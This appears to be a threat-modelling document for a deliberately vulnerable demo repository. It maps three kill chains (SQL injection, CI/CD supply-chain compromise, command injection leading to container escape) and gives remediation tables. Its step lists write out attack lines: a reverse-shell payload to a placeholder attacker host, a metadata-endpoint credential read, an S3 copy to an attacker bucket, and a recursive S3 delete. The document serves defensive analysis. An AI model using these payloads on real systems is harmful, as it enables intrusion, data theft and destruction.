# Kill-Chain Analysis — NexusCore Technologies

**Version:** 1.1  
**Classification:** Internal / Confidential  
**Scope:** Three attack chains modelled against the NexusCore DevSecOps pipeline  
**Framework:** Unified Kill Chain (UKC) cross-referenced with MITRE ATT&CK  
**All steps grounded in confirmed vulnerabilities in this repository.**

---

## Overview

This document maps three realistic attack scenarios against the NexusCore infrastructure as defined in this repository. Each chain is built exclusively from confirmed vulnerabilities — every step references the specific file and line-level finding that enables it.

| Chain | Entry Point | End Goal | Files Involved |
|-------|-------------|----------|----------------|
| Chain 1 | SQL injection via `/user` endpoint | Bulk cardholder data exfiltration via S3 | `vulnerable_app.py`, `main.tf` |
| Chain 2 | Compromised upstream dependency or CI/CD action | Persistent backdoor in container image | `requirements.txt`, `Dockerfile`, `devsecops-pipeline.yml` |
| Chain 3 | Command injection via `/ping` endpoint | EC2 host compromise and S3 data destruction | `vulnerable_app.py`, `Dockerfile`, `main.tf` |

---

## Chain 1 — Credential Theft & Bulk Data Exfiltration

### Narrative

An external attacker discovers the Flask API is publicly accessible (EC2 instance with `associate_public_ip_address = true` and a security group permitting all inbound traffic on `0.0.0.0/0`). They enumerate endpoints and identify the `/user` route.

### Step-by-Step

```
Phase 1 — Reconnaissance
  Discovery: EC2 public IP exposed; security group 0.0.0.0/0 all ports
  Source: terraform/main.tf — aws_security_group resource
  Technique: T1526 (Cloud Service Discovery)

Phase 2 — Initial Access
  Action: HTTP GET /user?username=' OR '1'='1
  Result: Full SQLite users table returned — all usernames, hashed passwords, and
          any PII stored in the users table
  Source: src/vulnerable_app.py — f-string concatenation in /user route
  Vulnerability: SQL Injection (CWE-89)
  Technique: T1190 (Exploit Public-Facing Application)

Phase 3 — Credential Access
  Action: Extract DATABASE_PASSWORD and API_KEY from source code
          (both hardcoded in vulnerable_app.py; detected by Gitleaks)
  Result: Attacker authenticates as the application service account
  Source: src/vulnerable_app.py lines — DATABASE_PASSWORD, API_KEY constants
  Technique: T1552 (Unsecured Credentials)

Phase 4 — Collection
  Action: Unauthenticated HTTP GET on S3 bucket objects
          (all four block_public_* settings disabled in main.tf)
  Result: Attacker lists and downloads all stored merchant/cardholder records
  Source: terraform/main.tf — aws_s3_bucket_public_access_block resource
  Technique: T1530 (Data from Cloud Storage Object)

Phase 5 — Exfiltration
  Action: aws s3 cp s3://<bucket>/ s3://<attacker-bucket>/ --recursive
          using stolen IAM credentials or no credentials (public bucket)
  Result: Full dataset transferred to attacker-controlled infrastructure
  Technique: T1537 (Transfer Data to Cloud Account)
```

### Security Controls That Should Have Stopped This

| Control Point | Gap | Remediation |
|--------------|-----|-------------|
| SQL injection | Parameterised queries not used | `cursor.execute("SELECT * FROM users WHERE username = ?", (username,))` |
| Hardcoded credentials | Gitleaks gate exists but only blocks — secrets still in source | Move to AWS Secrets Manager; rotate immediately |
| S3 public access | All four block_public_* settings disabled | Enable all four; enforce via SCP |
| Security group | 0.0.0.0/0 all ports | Restrict to known CIDR ranges on port 5000/443 only |

---

## Chain 2 — Supply Chain Compromise via CI/CD Pipeline

### Narrative

A threat actor identifies that the GitHub Actions workflow pins security tool actions to floating version tags (e.g. `aquasecurity/trivy-action@master`) rather than immutable commit SHAs. They compromise the upstream action repository or publish a malicious update, which is automatically consumed on the next pipeline run.

### Step-by-Step

```
Phase 1 — Reconnaissance
  Action: Attacker inspects .github/workflows/devsecops-pipeline.yml
          (publicly visible on a public repository)
  Finding: Actions pinned to floating tags — trivy-action@master,
           gitleaks-action@v2, etc.
  Source: .github/workflows/devsecops-pipeline.yml
  Technique: T1592 (Gather Victim Host Information)

Phase 2 — Initial Access via Supply Chain
  Vector A: Attacker publishes CVE-exploiting PyYAML payload via a
            typosquatted package name (e.g. pyyam1 vs pyyaml)
  Vector B: Attacker compromises the aquasecurity/trivy-action repository
            and pushes a malicious commit to the master branch
  Source: requirements.txt (PyYAML 5.4.1 — CVE-2020-14343, CVSS 9.8)
  Source: .github/workflows/devsecops-pipeline.yml (floating @master tag)
  Technique: T1195 (Supply Chain Compromise)

Phase 3 — Execution
  Action (Vector A): Malicious YAML payload sent to /load_config endpoint
                     triggers arbitrary code execution via yaml.load() with
                     FullLoader — CVE-2020-14343
  Action (Vector B): Malicious pipeline step executes in the runner context
                     with access to GITHUB_TOKEN and all repository secrets
  Source: src/vulnerable_app.py — yaml.load() call in /load_config
  Technique: T1059 (Command and Script Interpreter)

Phase 4 — Persistence
  Action: Malicious pipeline step injects a backdoor layer into the Docker
          image during build — e.g. adds a reverse shell or installs a
          beacon that persists across container restarts
  Source: Dockerfile — no image signing or digest verification
  Technique: T1525 (Implant Internal Image)

Phase 5 — Defence Evasion
  Action: Malicious step disables or bypasses the Gitleaks and Trivy gates
          within the same workflow run, suppressing findings
  Technique: T1562 (Impair Defenses)
```

### Security Controls That Should Have Stopped This

| Control Point | Gap | Remediation |
|--------------|-----|-------------|
| Floating Action tags | `@master` tags are mutable | Pin all Actions to immutable commit SHAs: `aquasecurity/trivy-action@a20de5...` |
| PyYAML CVE | Trivy SCA detects but only warns | Set `exit-code: '1'` on Critical severity to block merges |
| yaml.load() | Unsafe deserialisation | Replace with `yaml.safe_load()` |
| No image signing | Built images not verified | Implement cosign image signing in the pipeline |

---

## Chain 3 — Container Escape → EC2 Host Compromise → Data Destruction

### Narrative

An attacker exploits the command injection vulnerability in the `/ping` endpoint to gain a shell inside the container. Because the container runs as root with no capability restrictions, they escape to the EC2 host and use the hardcoded database password from the Terraform user_data to move laterally. They then use curl (installed unnecessarily in the Dockerfile) to establish C2, and ultimately destroy all S3 objects.

### Step-by-Step

```
Phase 1 — Initial Access
  Action: HTTP GET /ping?host=;id
          subprocess.check_output(f"ping -c 1 {host}", shell=True)
          returns uid=0(root) — command injection confirmed
  Source: src/vulnerable_app.py — /ping route, shell=True
  Vulnerability: Command Injection (CWE-78)
  Technique: T1190 (Exploit Public-Facing Application)

Phase 2 — Execution & Shell Establishment
  Action: Reverse shell payload via /ping?host=;bash -i >& /dev/tcp/<attacker>/4444 0>&1
  Result: Interactive root shell inside the container
  Source: src/vulnerable_app.py + Dockerfile (no USER instruction — runs as root)
  Technique: T1059.004 (Unix Shell)

Phase 3 — Privilege Escalation / Container Escape
  Action: Attacker enumerates mounted volumes and Docker socket;
          container runs as root (UID 0) — any kernel exploit or
          misconfigured volume mount elevates to EC2 host
  Source: Dockerfile — no USER instruction, no --read-only filesystem,
          no capability drop
  Technique: T1611 (Escape to Host)

Phase 4 — Credential Access on Host
  Action: Attacker reads EC2 user_data from instance metadata endpoint
          (curl http://169.254.169.254/latest/user-data)
          Retrieves DB_PASSWORD hardcoded in terraform/main.tf user_data block
  Source: terraform/main.tf — user_data with hardcoded DB_PASSWORD
  Note: curl is available in the container (installed in Dockerfile)
  Technique: T1552 (Unsecured Credentials)

Phase 5 — Lateral Movement
  Action: Attacker uses DB_PASSWORD to authenticate to any internal
          database or service reachable via the open security group
          (0.0.0.0/0 all ports egress also permits outbound C2)
  Source: terraform/main.tf — security group egress 0.0.0.0/0
  Technique: T1021 (Remote Services)

Phase 6 — Command and Control
  Action: Attacker uses curl/wget (installed in Dockerfile) to download
          a persistent C2 beacon; outbound HTTPS (443) unrestricted
  Source: Dockerfile — unnecessary packages: curl, wget, vim, net-tools
  Source: terraform/main.tf — egress 0.0.0.0/0 all ports
  Technique: T1071 (Application Layer Protocol)

Phase 7 — Impact: Data Destruction
  Action: aws s3 rm s3://<bucket>/ --recursive
          S3 bucket has no versioning or Object Lock configured
          All objects permanently deleted
  Source: terraform/main.tf — aws_s3_bucket (no versioning block)
  Technique: T1485 (Data Destruction)
```

### Security Controls That Should Have Stopped This

| Control Point | Gap | Remediation |
|--------------|-----|-------------|
| Command injection | `shell=True` with user input | Remove `shell=True`; use `shlex.split()`; allowlist permitted hostnames |
| Root container | No `USER` instruction | `RUN useradd -m appuser && USER appuser`; drop all capabilities |
| Hardcoded DB_PASSWORD | Plaintext in Terraform user_data | Use AWS Secrets Manager; reference via `aws_secretsmanager_secret_version` data source |
| Unnecessary tools | curl, wget, vim, net-tools in image | Remove all; use distroless or scratch base image |
| Open egress | 0.0.0.0/0 all ports outbound | Restrict egress to required ports and known endpoints only |
| No S3 versioning | Objects permanently deletable | Enable versioning + Object Lock (COMPLIANCE mode) |

---

## Cross-Chain Detection Opportunities

The following controls would surface activity across all three chains:

| Control | Chains Covered | Implementation |
|---------|---------------|----------------|
| CloudTrail + Athena anomaly query | 1, 3 | Alert on > 500 S3 GetObject calls in 10 minutes from a single principal |
| WAF rule: SQL meta-characters in query params | 1 | Block `'`, `--`, `OR 1=1` patterns on the Flask API |
| Container runtime policy (Falco) | 2, 3 | Alert on shell spawned by Python process; alert on outbound connections from container |
| GitHub Actions OIDC + short-lived credentials | 2 | Remove static IAM keys; pipeline assumes role via OIDC with session duration ≤ 1 hour |
| Dependabot + Trivy exit-code: 1 on Critical | 2 | Block PRs with Critical CVEs from merging; auto-open PRs for dependency upgrades |
